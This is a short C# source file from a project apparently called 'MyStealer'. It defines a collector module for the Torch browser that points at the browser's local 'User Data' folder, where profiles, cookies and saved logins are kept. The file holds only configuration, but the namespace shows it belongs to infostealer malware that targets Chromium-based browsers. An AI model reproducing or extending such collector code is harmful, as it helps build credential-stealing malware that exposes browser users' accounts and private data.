using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    internal class Torch : Chromium
    {
        public override string ModuleName => "Torch";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Torch", "User Data");
    }
}
